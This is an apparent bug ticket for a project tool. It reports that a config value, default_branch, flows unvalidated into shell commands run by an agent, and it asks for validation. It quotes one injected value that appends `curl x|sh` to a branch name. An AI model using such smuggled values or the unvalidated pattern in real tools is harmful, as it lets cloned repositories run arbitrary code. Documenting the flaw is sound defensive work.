---
id: PMK-192
title: Validate default_branch before pause and progress put it in a shell command
type: bug
status: backlog
priority: high
estimate: 1
related: [PMK-65]
created: 2026-10-31T19:29:35.913Z
updated: 2026-10-31T19:29:35Z
---

## Description

### Context

Found by the third review of PR #103 (PMK-65). It predates EPC-6. `docs next-adr` now validates the branch name, but other paths do not. Source: PMK-65, PR #103.

### Scope (in)

- `defaultBranch(ctx)` in `scripts/pmkit.mjs:300` returns `git_host.default_branch` from `.pmkit/config.yaml` as it is.
- `commands/issues/pause.md:25` and `commands/issues/progress.md:21` put that value into a shell command. A cloned repository with `default_branch: "main; curl x|sh"` gets that text into the agent's shell.
- `validBranch` accepts only ASCII, so a branch such as `développement`, which git accepts, is refused.

### Out of scope

- The improvements listed in `docs/superpowers/epc-6-follow-ups.md`.

## Acceptance criteria

- [ ] Every reader of `default_branch` goes through one validation, and an invalid name falls back to `main` with a `note:`
- [ ] No command file puts a config value into a shell command without that validation
- [ ] `validate` reports an invalid `default_branch`
